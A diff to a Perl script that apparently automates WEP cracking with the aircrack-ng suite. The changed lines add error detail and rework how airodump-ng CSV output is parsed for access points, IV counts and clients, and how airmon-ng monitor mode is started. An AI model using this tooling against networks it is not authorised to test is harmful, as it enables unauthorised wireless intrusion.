 	waitpid($pid, 0);
-         open NETSTAT, "netstat -rn|" or die "Can't run netstat.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n"; 
+         open NETSTAT, "netstat -rn|" or die "Can't run netstat.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n"; 
          while (<NETSTAT>){
            next unless /^0.0.0.0/;
            $gateway = (split/\s+/,$_)[1];
@@ -1230,7 +1350,7 @@ my $bssid;
 my $client;
 my $iv;
 
-die "Could not fork airodump-ng!" unless defined (my $pid = fork);
+die "Could not fork airodump-ng!: $!\n\n" unless defined (my $pid = fork);
 
 if ($pid == 0){
   print "\nScanning channel $channel for WEP-enabled Access Points\n";
@@ -1249,7 +1369,7 @@ system("stty", "sane");
 
 
 my $basestation;
-open CSV, $csv or die "Cannot open airodump output.\n";
+open CSV, $csv or die "Cannot open airodump output.: $!\n\n";
 while (<CSV>){
 chomp;
 next if /^\r$/;
@@ -1265,17 +1385,15 @@ $basestation = 0;
 
 if ($basestation){
 next if /^BSSID/;
-  $chan_on_file = (split /,/,$_)[3];
-  $chan_on_file =~ s/^\s*//;
+  $chan_on_file = (split /,\s+/,$_)[3];
   next if $channel != $chan_on_file;
-  ($ssid) = (split /,/, $_)[ -2 ];
-  $ssid =~ s/^\s*//;
-  $ssid =~ s/\x00*//;
+  my @uglyssid = (split/,/, $_,13);
+  $ssid = "@uglyssid"; 
+  ($ssid) = $ssid =~ /\d+,\s+(.+)\s+.$/;
+  chop $ssid;
   $ssid =~ s/^\s*$/hidden/;
-  $bssid = (split /,/,$_)[0];
-  $bssid =~ s/^\s*//;
-  $iv = (split /,/,$_)[10];
-  $iv =~ s/^\s*//;
+  $bssid = (split /,\s+/,$_)[0];
+  $iv = (split /,\s+/,$_)[10];
  $all_ap{ $bssid } = {
 			 bssid => $bssid,
 			 iv => $iv,
@@ -1289,9 +1407,8 @@ next if /^BSSID/;
 }else{
  next if /not/;
  next if (/^Station/);
-  $bssid = (split /,/,$_)[5];
-  $bssid =~ s/^\s*//;
-  $client = (split /,/,$_)[0];
+  $bssid = (split /,\s+/,$_)[5];
+  $client = (split /,\s+/,$_)[0];
 
 ### Store clients to the 'client' anonymous array we have created before
 ### exists check is for the BSSIDs we find here that we didn't find above (meaning, we only found the bssid because of the client)
@@ -1343,7 +1460,7 @@ my $atheros = 0;
 my $mac80211 = 0;
 
 
-open AIRMONSTART, "airmon-ng start $inject_iface |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}\n\n"; 
+open AIRMONSTART, "airmon-ng start $inject_iface |" or die "Can't run airmon-ng.\nMake sure it can be found in one of these directories:\n\t$ENV{'PATH'}: $!\n\n"; 
 
 while (<AIRMONSTART>){
   if ($monitor_error){
